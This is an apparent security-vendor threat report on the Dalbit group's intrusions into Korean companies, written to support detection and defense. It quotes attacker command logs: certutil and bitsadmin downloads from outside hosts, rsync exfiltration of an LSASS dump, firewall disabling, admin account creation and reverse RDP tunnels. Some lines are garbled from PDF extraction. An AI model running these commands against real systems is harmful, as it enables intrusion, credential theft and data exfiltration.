Overview\n\nThis report is a continuation of the “Attackers Using FRP (Fast Reverse Proxy) to Attack Korean Companies” post that was uploaded on August\n16, 2022 and follows the group’s activities since that post.\n\nThis group has always relied on open-source tools and lacked any distinct characteristics to profile them due to the lack of PDB information.\nAdditionally, the amount of information that could be collected was limited unless the affected Korean companies specifically asked for an\ninvestigation since the threat actor’s C2 (Command&Control) server abused the servers of the Korean companies. However, after the post was\nuploaded and a portion of the Korean company servers used by the threat actor were blocked, the threat actor began to use a hosting server\ncalled “*.m00nlight.top” as their C2 and download server. Thus, the ASEC team decided to call this group Dalbit (m00nlight.top) after the\nKorean word for ‘Moonlight’.\n\nThis group has had more than 50 confirmed attack attempts on Korean companies since 2022. Most of the attacked companies were mid to\nsmall companies while a portion was major companies. The team has confirmed that 30% of the infected companies were using a certain\nKorean groupware solution. It is currently difficult to check whether this groupware product has a vulnerability or not, but if a server that is\nthis exposed has a vulnerability, then there is a chance that companies could be affected gravely through the leakage of confidential\ninformation and ransomware behavior. Furthermore, this Dalbit group leaves some infected companies as proxies and download servers to\nlater use them as means to communicate with the threat actor upon infiltration of another company.\n\nTherefore, we strongly recommend performing an internal security check if users suspect that they have been attacked by this Dalbit group.\nThe team asks that users send a report to AhnLab and take preemptive measures to prevent secondary harm and potential damage to other\ncompanies.\n\n## 1. Affected Korean Companies (Industry Type)\n\nListed below are the 50 companies that were confirmed to have been affected since 2022. Companies that have not been clearly confirmed were\nexcluded from this list. It is possible that more companies could have been affected.\n\nFigure 1. Industry types of companies that the Dalbit group tried to attack\n\nThe following are the descriptions of each industry type.\n\nTechnology: Companies that handle software or hardware\nIndustrial: Manufacturing companies that handle machinery, paint jobs, steel, metals, etc.\nChemical: Cosmetic, pharmaceutical, and plastic companies\nConstruction: Associations or organizations related to construction or construction companies\nAutomobile: Automobile-related manufacturing companies\nS i d t S i d t l t d f t i i\n\n\n-----\n\nducat o : ducat o a co pa es\nWholesale: Wholesalers\nMedia: Printing and media companies\nFood: Food companies\nShipping: Shipping companies\nHospitality: Leisure or tourist accommodation companies\nEnergy: Energy companies\nShipbuilding: Shipbuilding companies\nConsulting: Management consulting companies\n\n## 2. Flow and Characteristics\n\n### 2.1. Summary Diagram\n\nFigure 2. Summary diagram of Dalbit group’s infiltration process\n\nThe above diagram shows the threat actor’s infiltration process into Company B. A brief summary of this flow is in the table below.\n\n**1) Initial Access**\n\n**The threat actor targets web servers or SQL servers, which they gain access to by exploiting vulnerabilities. They then**\n**attempt to control the systems with tools such as WebShell.**\n**2) Command & Control**\n\n**Various hacking tools are downloaded through WebShell. Hacking tools include various binaries such as privilege escalation**\n**tools, proxy tools, and network scanning tools.**\n**3) Proxy & Internal Reconnaissance**\n\n**Proxy: The threat actor installs a proxy tool such as FRP (Fast Reverse Proxy) before attempting to connect to 2-1) a hosting**\n**_server built by the threat actor or 2-2) another previously infected company’s server (Company A) via Remote Desktop (RDP)._**\n\n**Internal Reconnaissance: Tools such as network scanning tools and account theft tools are used for internal reconnaissance**\n**and obtaining information.**\n**4) Lateral Movement**\n\n**The obtained information is used to move to another connectible server or PC. Afterward, a proxy tool (FRP) is also installed**\n**on the PC that has successfully been reached through lateral movement, creating an environment which allows the threat**\n**actor to connect via RDP. The required privilege level is then acquired by either adding a specific account or through a**\n**credential theft tool like Mimikatz.**\n**5) Impact**\n\n**Ultimately, after the threat actor steals all the information they desire, they use BitLocker to lock certain drives and demand a**\n**ransom.**\n\nTable 1. Explanation of the infiltration summary diagram\n\nThe following are major characteristics of the Dalbit group.\n\n### 2.2.

Malware and hacking tools used by Dalbit\n\nOnly one tool for leaking emails seems to have been made by the group themselves. The rest are normal Windows programs or tools that can\neasily be found online.\n\n### 3.2. Infiltration Process\n\n**3.2.1. Initial Infiltration**\n\nIt is assumed that their attack targets are usually servers with a specific Korean groupware installed on them, email servers (Exchange Server),\nand SQL servers. The threat actor exploited either file upload vulnerabilities or WebLogic vulnerabilities such as CVE-2017-10271 to upload\ntheir WebShell. A portion appeared to have used a SQL server command prompt (xp_cmdshell).\n\nThe most frequently used WebShells are Godzilla, ASPXSpy, AntSword, and China Chopper in that order. Aside from these, several other\nWebShells were also found.\n\nThe installation paths of the WebShells are as follows.\n\n\n-----\n\n– Job recruitment (File upload vulnerability)\n**D:\\WEB\\********recruit\\css\\1.ashx**\n**D:\\WEB\\********recruit\\css\\4.ashx**\n**D:\\WEB\\********recruit\\common\\conf.aspx**\n**...**\n– File upload vulnerability\n**D:\\UploadData\\***********\\****_File\\Data\\Award\\1.ashx**\n**D:\\UploadData\\***********\\****_File\\Data\\Award\\2.aspx**\n**D:\\UploadData\\***********\\****_File\\Data\\Award\\3.aspx**\n**D:\\**WebService\\********\\*****Editor\\sample\\photo_uploader\\File\\conf.aspx**\n**D:\\**WebService\\********_ThesisSubmission\\Include\\file.aspx**\n**...**\n– Certain groupware\n**D:\\Web\\(Groupware)\\cop\\1.ashx**\n**D:\\Web\\(Groupware)\\app\\4.ashx**\n**D:\\Web\\(Groupware)\\bbs\\4.asmx**\n**D:\\Web\\(Groupware)\\erp\\tunnel.aspx (ReGeorg)**\n**D:\\inetpub\\(Groupware)\\image\\2.asmx**\n**D:\\inetpub\\(Groupware)\\image\\2.aspx**\n**C:\\(Groupware)\\Web\\(Groupware)\\cop\\conf.aspx**\n**C:\\(Groupware)\\Web\\(Groupware)\\cop\\1.ashx**\n**C:\\(Groupware)\\Web\\(Groupware)\\cop\\1.asmx**\n**C:\\(Groupware)\\Web\\(Groupware)\\cop\\1.aspx**\n**…**\n– Email server (Exchange Server)\n**D:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\aa.aspx**\n**D:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\11.aspx**\n**C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET**\n**Files\\root\\91080f08\\2694eff0\\app_web_defaultwsdlhelpgenerator.aspx.cdcab7d2.sjx_41yb.dll**\n**C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET Files\\root\\91080f08\\2694eff0\\app_web_ldaj2kwn.dll**\n**…**\n– WeblogicD:\\***\\wls1035\\domains\\************\\servers\\*******\\tmp\\************\\uddiexplorer\\gcx62x\\war\\modifyregistryhelp.jsp\n**D:\\***\\wls1035\\domains\\************\\servers\\*******\\tmp\\************\\wls-wsat\\zfa3iv\\war\\eee.jsp**\n**D:\\***\\wls1035\\domains\\************\\servers\\*******\\tmp\\************\\wls-wsat\\zfa3iv\\war\\error.jsp**\n**D:\\Oracle\\**********\\user_projects\\domains\\*************\\servers\\WLS_FORMS\\tmp\\************\\wls-wsat\\tcsxmg\\war\\123.jsp**\n**D:\\Oracle\\**********\\user_projects\\domains\\*************\\servers\\WLS_FORMS\\tmp\\************\\wls-wsat\\tcsxmg\\war\\test.jsp**\n**D:\\Oracle\\**********\\user_projects\\domains\\*************\\servers\\WLS_FORMS\\tmp\\************\\wls-wsat\\tcsxmg\\war\\aaa.jsp**\n**…**\n–Tomcat\n**C:\\(Tomcat)\\webapps\\dd\\sb.jsp**\n**C:\\(Tomcat)\\webapps\\ddd\\index.jsp**\n**C:\\(Tomcat)\\webapps\\docs\\update.jsp**\n**C:\\(Tomcat)\\webapps\\tmp\\shell.jsp**\n\nTable 4. Paths where WebShells were uploaded\n\n**3.2.2. Download**\n\nThe threat actor downloads other hacking tools through default Windows programs. Since WebShells are normally used in infiltration, parent\nprocesses, excluding command processes like cmd, are run by web server processes such as w3wp.exe, java.exe, sqlserver.exe, and\ntomcat*.exe. The downloaded files include privilege escalation tools, proxy tools, and network scanning tools, all of which are required by the\nthreat actor. The download command is as follows.\n\n(Additionally, the full addresses of the Korean companies that have been exploited will not be disclosed.)\n\n1) Certutil\n\n  - certutil -urlcache -split -f hxxp://www.ive***.co[.]kr/uploadfile/ufaceimage/1/update.zip c:\\programdata\\update.exe (frpc)\n\n  - certutil -urlcache -split -f hxxp://121.167.***[.]***/temp/8.txt c:\\programdata\\8.ini (frpc.ini)\n\n[> certutil -urlcache -split -f hxxp://103.118.42[.]208:8080/frpc.exe frpc.exe](https://asec.ahnlab.com/en/47455/8080/frpc.exe)\n\n…\n\nTable 5.

Major directories used by the Dalbit group\n\nTherefore, the files in these paths should be checked if users suspect that they have been infiltrated.\n\n**3.2.3. Privilege Escalation and Account Addition**\n\nThe threat actor mainly used Potato (BadPotato, JuicyPotato, SweetPotato, RottenPotato, EFSPotato) and PoC (CVE-2018-8639, CVE-20191458), which has been published on GitHub, for privilege escalation. After privilege escalation, they characteristically add the following\naccount.\n\nThe below sp.exe is the SweetPotato tool.\n\n**> sp.exe “whaomi” (Privilege check)**\n\n**> sp.exe “netsh advfirewall set allprofiles state off” (Firewall OFF)**\n\n**> sp.exe “net user main ff0.123456 /add & net localgroup administrators main /add” (Add account)**\n\nTable 8. SweetPotato usage log\n\nThe point of focus here is the name of the account added by the threat actor. Threat actor accounts with the name “main” have been found in\nother infiltrated company servers.\n\nAside from adding accounts, the threat actor would also use stolen admin accounts.\n\n**> wmic /node:127.0.0.1 /user:storadmin /password:r*****1234!@#$ process call create “cmd.exe /c c:\\temp\\s.bat”**\n\nTable 9. Admin account execution log\n\n**3.2.4. Proxy Settings**\n\nAfter infiltrating a server, the threat actor initiates access via proxy to use RDP communications. FRP and LCX were the mainly used proxy\n[tools, and there have been cases where ReGeorg,](https://github.com/sensepost/reGeorg) [NPS, or](https://github.com/ehang-io/nps) [RSOCKS was found in some companies. Additionally, multiple proxy tools including](https://github.com/tonyseek/rsocks)\nFRP and LCX were found in one area of a certain company that was infiltrated. Multiple FRP configuration files (.ini) would also be discovered\nin cases where internal propagation had occurred. We believe that the threat actor installs additional FRPs and uses multiple configuration\nfiles when an accessible PC has a lot to gain. Furthermore, the LCX used by this group has the same features as the open-source LCX, but its\nversion is not the same as the one uploaded to GitHub, meaning that a binary that was arbitrarily compiled by a Chinese person was used.\n\nProxy tools like FRP and LCX differ in terms of forwarding methods and supported protocols. However, since their differences, actual infection\ncases, recreation, and network packets have all been covered in the TI report, “Analysis Report on Attack Cases Exploiting Various Remote\nControl Tools,” they will not be reiterated in this post.\n\n1) FRP(FAST REVERSE PROXY)\n\nFRP configuration files (.ini) were found in all servers and PC devices infiltrated by this group. The following is an actual case of an infiltrated\ncompany.\n\nFigure 3. FRPC configuration file (m00nlight.top) found in an infiltrated company\n\nIn particular, the Dalbit group usually used the Socks5 protocol to communicate. The Socks5 protocol is a layer 5 protocol in the 7 OSI layers. It\ncan handle various requests such as HTTP, FTP, and RDP since it is between layer 4 and 7. Therefore, if the threat actor uses a proxy\nconnection tool that can handle Socks5, such as Proxifier, remote control through RDP becomes possible. If a connection can be established to\nan internal PC, lateral movement can also be achieved. Thus, if the configuration file is set as a Socks5 protocol, the threat actor will have more\nf d dditi l difi ti ill l b q i d t h dl i q t\n\n\n-----\n\nFigure 4. Example of Socks5 usage\n\nThe following are FRP filenames and commands used by the threat actor. The list is in a descending order from most to least used.\n\nFRP filenames\n\n**update.exe**\n\n**debug.exe**\n\n**main.exe**\n\n**info.exe**\n\n**Agent.exe**\n\n**frpc.exe**\n\n**test.exe**\n\n**zabbix.exe**\n\n**winh32.exe**\n\n**cmd.exe**\n\nTable 10. FRP filenames\n\nFRP commands\n\n**> update.exe -c frpc.ini**\n\n**> update.exe -c 8080.ini**\n\n**> update.exe -c 8.ini**\n\n**> info.zip -c frpc__8083.ini**\n\n**> debug.exe -c debug.ini**\n\n**> debug.exe -c debug.log**\n\n**> debug.exe -c debug.txt**\n\n**> frpc.exe -c frpc__2381.ini**\n\n**> cmd.exe /c c:\\temp\\****\\temp\\frpc.ini**\n\n**…**\n\nTable 11. FRP execution log\n\nIn certain companies, the FRP was registered to the task scheduler (schtasks) under the name “debug” to maintain its persistence. As shown in\nTable 12, the team confirmed the execution of a registered scheduler.\n\n\n-----\n\n**> schtasks /tn debug /run**\n\n2) LCX(HTRAN)\n\n\nTable 12. Task scheduler execution log\n\n\n[Dalbit used an LCX (Htran) binary compiled by a certain Chinese person. This has the same features as the existing binary, but it also includes](https://github.com/HiwinCN/HTran)\nthe nickname of the binary creator.\n\nFigure 5. Screen that is displayed upon executing the LCX used by the Dalbit group (By 折羽鸿鹄)\n\nWe can confirm through this that the nickname of the person who had created the binary is “折羽鸿鹄” (QQ:56345566). It is highly unlikely\nthat this developer is the threat actor in question; however, since this binary cannot be downloaded through a simple search online, it is\nassumed that the threat actor has a connection to China.\n\nThe installed filenames and executables are as follows:\n\nLCX filenames\n\n**lcx3.exe**\n\n**lcx.exe**\n\n**update.exe**\n\nTable 13. LCX filenames\n\nLCX commands\n\n**> update.exe -slave 1.246.***.*** 110 127.0.0.1 3389**\n\n**> lcx3.exe -slave 222.239.***.*** 53 127.0.0.1 3389**\n\n**…**\n\nTable 14. LCX command log\n\nThe above LCX C2 is a Korean company server and has been concealed.\n\n**3.2.5. Internal Reconnaissance**\n\nFscan and NBTScan have been commonly used for network scans, but the usage of TCP Scan and Goon have also been confirmed for some\ncases.\n\n[Goon is a network scanning tool made with Golang that not only allows basic port scanning, but scanning for Tomcat, MSSQL, and MYSQL](https://github.com/i11us0ry/goon)\naccounts as well. We can see that this tool was also made in Chinese.\n\n\n-----\n\nFigure 6. Screen that is displayed upon executing Goon\n\n**3.2.6. Information Extortion**\n\nLSASS Dump information and EML files of certain accounts are usually the information that is stolen. It has been confirmed that installed\nprograms are checked through a WMIC command or a screenshot of the affected PC is sent to the threat actor’s server at regular intervals\naccording to the companies.\n\n1) Credential Extraction (LSASS Dump)\n\nAccording to the target, the threat actor would choose to not install Mimikatz and attempt to extract credentials instead. This is a method that\ndumps the Lsass.exe process. Credential information can be obtained from a PC with tools like Mimikatz or Pypykatz since they can be found\nwithin the dump file. Additionally, a detailed explanation of Mimikatz can be found in the TI report, “Analysis Report on Internal Web\nSpreading Methods Using Mimikatz“.\n\nThe following method is how the threat actor stole credentials without Mimikatz.\n\n1-1) Dumpert\n\n[Open-source Dumpert is an API hooking evasion tool that operates according to the target OS system and uses the MiniDumpWriteDump()](https://github.com/outflanknl/Dumpert)\nAPI to dump the lsass.exe process. The threat actor modified the code to change the path of the dump file and remove features like log output.\n\nFigure 7. Left (open-source Dumpert) vs. right (Dumper used by the Dalbit group)\n\n\n-----\n\ne above gu e s ows t at t e two ve s o s a e t e sa e as de o t e d e e t pat s a d t e e ova o t e output st g.\n\nThe following table displays all of the “%SystemRoot%\\temp” dump file paths that have currently been found.\n\n**%SystemRoot%\\temp\\duhgghmpert.dmp**\n\n**%SystemRoot%\\temp\\dumpert.dmp**\n\n**%SystemRoot%\\temp\\tarko.dmp**\n\n**%SystemRoot%\\temp\\lsa.txt**\n\n**…**\n\nTable 15. Lsass dump file paths\n\n1-2 ) Procdump\n\n[Procdump is a normal utility program provided by Microsoft and offers the process dump feature. The threat actor performed a dump like the](https://learn.microsoft.com/ko-kr/sysinternals/downloads/procdump)\none in Figure 8 with this tool.\n\nFigure 8. Output upon executing Procdump\n\nAfterward, the threat actor used a tool called Rsync (Remote Sync) to send the dump file to their own server. The following is an actual example\nof information theft attempted by the threat actor.\n\n**> svchost.exe -accepteula -ma lsass.exe web_log.dmp**\n\n**> rsync -avz –port 443 web_log.zip test@205.185.122[.]95::share/web_log.zip**\n\nTable 16. Procdump execution and rsync usage log\n\n2) Email Extraction\n\nFigure 9. Screen displayed upon executing email extraction tool\n\nThis sample is an email extraction tool developed with Golang and presumably the only known tool developed by the threat actor themselves.\nThis tool offers the ability to target a company’s Exchange email server and extract a specific account’s email with EWS (Exchange Web\nService) as an EML file. Arguments include the Exchange server address, account name, NTLM password hash of said account, date and time,\netc. When launched, the tool extracts every email from the mailboxes of the target account according to the time received as an argument and\nsaves them as an EML file.\n\nFor reference, the PDB information of this binary is “fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff”and is meaningless.\n\n\n-----\n\nFigure 10. PDF information of the email extraction tool\n\n3) Screen Leak\n\nThe threat actor sent screenshots from certain PCs to their own server. While a binary that takes screenshots of the current screen has not been\nfound as of yet, the threat actor’s server where the infected PC’s screenshots were being sent has been discovered. Screenshots from a certain\ncompany’s infiltrated PC sent pictures every 5-10 seconds.\n\nOutgoing server of threat actor’s screenshots: hxxp://91.217.139[.]117:8080/1.bat\n\n\n-----\n\nFigure 11. Actual PC screenshot sent from a certain affected company\n\nOnly images were sent. The PC could not be controlled remotely and no audio was outputted either.\n\nAlso, the threat actor’s server (91.217.139[.]117) where the screenshots were being sent was also being used as a download server for another\ncompany.\n\n**>certutil -urlcache -split -f** **[hxxp://91.217.139[.]117:8080/calc32.exe](https://asec.ahnlab.com/en/47455/8080/calc32.exe)**\n\n**>certutil -split -urlcache -f** **[hxxp://91.217.139[.]117:8443/log.ini c:\\temp](https://asec.ahnlab.com/en/47455/8443/log.ini)** **>bitsadmin /transfer mydownloadjob /download**\n**[/priority normal “hxxp://91.217.139[.]117:8080/calc32.exe” “c:\\windows\\debug\\winh32.exe” (frpc)](https://asec.ahnlab.com/en/47455/8080/calc32.exe)**\n\n**[>bitsadmin /transfer mydownloadjob /download /priority normal “hxxp://91.217.139[.]117:8001/log.ini”](https://asec.ahnlab.com/en/47455/8001/log.ini)**\n**“c:\\windows\\debug\\log.ini” (frpc.ini)**\n\nTable 17.

Firewall OFF\n\n\nThe Dalbit hacking group attempted attacks against vulnerable Korean company servers, and logs are being reported not only from mid-sized\nand smaller businesses, but also from some large companies. In particular, 30% of the affected companies were found to have been using a\ncertain Korean groupware product. Moreover, this group uses publicly available tools, from the WebShell used in the early stages to the\nransomware used at the end. Among these tools, there is a proxy tool that is assumed to have been obtained from a Chinese community, a tool\nwith Chinese documentation, and a Chinese tool not mentioned in this post. It can be assumed that the threat actor has at least a partial\nconnection with China, considering their frequent usage of Chinese tools.\n\nIf a server admin suspects that their system has been infected, they are advised to check their IOC along with the aforementioned download\npaths and account name (“main”) often used by the threat actor. If suspicions are confirmed, then it is advised to immediately report your\nsituation to AhnLab in order to minimize additional harm. Furthermore, admins should prevent vulnerability attacks by updating their servers\nto the newest version for vulnerability patches, and maintenance is especially needed for servers that are open externally but not managed.\n\n## 5. IOC\n\nFor reference, the IP addresses of Korean company servers abused by the threat actor will not be disclosed on the ASEC blog.\n\nMitre Attack\n\n\n**Execution** **Persistence**
